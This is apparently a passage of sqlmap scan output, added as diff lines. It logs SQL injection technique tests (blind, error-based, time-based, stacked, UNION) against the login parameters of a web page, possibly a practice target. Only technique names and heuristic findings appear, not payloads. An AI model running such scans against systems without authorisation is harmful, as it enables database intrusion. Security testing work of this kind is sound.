+[07:47:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[07:47:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[07:47:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[07:47:29] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[07:47:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[07:47:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[07:48:02] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[07:48:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[07:48:31] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[07:48:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[07:48:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[07:49:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[07:49:14] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[07:49:24] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[07:49:39] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[07:49:53] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[07:50:07] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[07:50:21] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[07:50:31] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[07:50:41] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[07:50:50] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[07:51:00] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[07:51:14] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[07:51:24] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[07:51:37] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[07:51:47] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[07:52:02] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[07:52:16] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[07:52:26] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[07:52:35] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                                        
+[07:52:45] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                              
+[07:52:52] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[07:52:52] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[07:52:52] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
+[07:52:53] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'                                                                                           
+[07:53:06] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[07:53:06] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[07:53:07] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[07:53:07] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[07:53:08] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'                                                                                               
+[07:53:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[07:53:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[07:53:35] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[07:54:05] [WARNING] GET parameter 'username' does not seem to be injectable
+[07:54:05] [INFO] testing if GET parameter 'password' is dynamic
+[07:54:05] [WARNING] GET parameter 'password' does not appear to be dynamic
+[07:54:06] [INFO] heuristic (basic) test shows that GET parameter 'password' might be injectable (possible DBMS: 'PostgreSQL or MySQL')
+[07:54:06] [INFO] heuristic (XSS) test shows that GET parameter 'password' might be vulnerable to cross-site scripting (XSS) attacks
+[07:54:06] [INFO] testing for SQL injection on GET parameter 'password'
+[07:54:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[07:54:11] [INFO] testing 'Generic inline queries'
+[07:54:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[07:54:40] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[07:55:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[07:55:04] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[07:55:04] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[07:55:04] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'                                                                                 
+[07:55:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[07:55:07] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[07:55:07] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[07:55:08] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[07:55:27] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[07:55:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:56:03] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+[07:56:16] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[07:56:16] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
+[07:56:17] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[07:56:17] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
+[07:56:18] [INFO] testing 'PostgreSQL inline queries'
+[07:56:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[07:56:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[07:56:36] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[07:56:43] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[07:56:54] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[07:56:59] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[07:57:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[07:57:23] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
+[07:57:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[07:57:46] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
+[07:57:55] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[07:58:10] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
+[07:58:23] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
+[07:58:33] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
+[07:58:42] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[07:58:42] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
+[07:58:43] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[07:58:43] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[07:58:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[07:59:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[07:59:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[07:59:28] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                                                          
+[07:59:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                 
+[08:00:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                  
+[08:00:46] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                      
+[08:01:15] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                       
+[08:01:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                 
+[08:02:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                  
+[08:02:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[08:02:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                                                             
+[08:02:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[08:02:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[08:02:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[08:02:30] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                                                             
+[08:02:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:02:32] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                         
+[08:02:32] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:02:32] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                          
+[08:02:32] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[08:02:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[08:02:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                           
+[08:03:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[08:03:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                       
+[08:03:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[08:04:00] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                               
+[08:04:17] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[08:04:33] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                               
+[08:04:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[08:05:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[08:05:24] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                      
+[08:05:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                              
+[08:05:58] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                               
+[08:06:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                 
+[08:06:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                  
+[08:06:47] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[08:07:03] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:07:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:07:28] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:07:39] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[08:07:39] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[08:07:39] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[08:07:40] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[08:07:40] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[08:07:40] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[08:07:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[08:07:41] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
+[08:07:42] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
+[08:07:42] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
+[08:07:43] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
+[08:07:43] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[08:07:44] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[08:07:45] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
+[08:07:45] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[08:07:46] [INFO] testing 'MySQL inline queries'
+[08:07:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:07:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:08:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:08:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:08:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:08:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:08:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:08:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[08:09:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[08:09:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[08:09:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[08:09:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[08:09:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[08:10:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[08:10:14] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[08:10:28] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[08:10:43] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[08:10:57] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[08:11:11] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[08:11:21] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[08:11:30] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[08:11:40] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[08:11:49] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[08:12:03] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[08:12:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[08:12:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[08:12:36] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[08:12:50] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[08:13:04] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[08:13:14] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[08:13:23] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                                        
+[08:13:33] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                              
+[08:13:39] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[08:13:39] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[08:13:40] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
+[08:13:40] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'                                                                                           
+[08:13:53] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[08:13:54] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[08:13:54] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[08:13:54] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[08:13:55] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'                                                                                               
+[08:13:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[08:13:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[08:14:22] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[08:14:48] [WARNING] GET parameter 'password' does not seem to be injectable
+[08:14:48] [INFO] testing if GET parameter 'user-info-php-submit-button' is dynamic
+[08:14:49] [WARNING] GET parameter 'user-info-php-submit-button' does not appear to be dynamic
+[08:14:49] [WARNING] heuristic (basic) test shows that GET parameter 'user-info-php-submit-button' might not be injectable
+[08:14:49] [INFO] testing for SQL injection on GET parameter 'user-info-php-submit-button'
+[08:14:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:14:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:14:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:15:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[08:15:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                                                          
+[08:15:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                 
+[08:15:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                  
+[08:15:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                      
+[08:16:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                       
+[08:16:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                 
+[08:16:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                  
+[08:16:57] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:17:10] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:17:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:17:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[08:17:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                                                             
+[08:17:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[08:17:27] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[08:17:27] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[08:17:27] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                                                             
+[08:17:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[08:17:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[08:17:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[08:17:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'                                                                                 
+[08:17:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:17:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                         
+[08:17:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:17:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                          
+[08:17:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[08:17:31] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[08:17:32] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[08:17:32] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[08:17:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[08:17:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[08:17:48] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[08:17:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                           
+[08:18:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[08:18:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                       
+[08:18:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[08:19:08] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                               
+[08:19:21] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[08:19:33] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                               
+[08:19:46] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[08:19:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[08:20:09] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                      
+[08:20:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                              
+[08:20:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                               
+[08:20:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                 
+[08:21:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                  
+[08:21:27] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[08:21:42] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:21:56] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:22:03] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[08:22:21] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+[08:22:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:22:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[08:22:42] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[08:22:42] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[08:22:42] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[08:22:43] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[08:22:43] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[08:22:43] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[08:22:44] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[08:22:44] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
+[08:22:44] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
+[08:22:45] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
+[08:22:45] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
+[08:22:46] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
+[08:22:46] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[08:22:47] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[08:22:47] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
+[08:22:48] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[08:22:49] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[08:22:49] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
+[08:22:50] [INFO] testing 'Generic inline queries'
+[08:22:50] [INFO] testing 'MySQL inline queries'
+[08:22:51] [INFO] testing 'PostgreSQL inline queries'
+[08:22:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:22:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:23:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:23:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:23:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:23:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:23:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[08:23:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[08:24:04] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[08:24:09] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[08:24:17] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[08:24:22] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[08:24:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:24:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[08:24:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[08:25:03] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[08:25:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[08:25:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[08:25:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[08:25:41] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[08:25:51] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[08:26:06] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[08:26:17] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[08:26:28] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[08:26:38] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
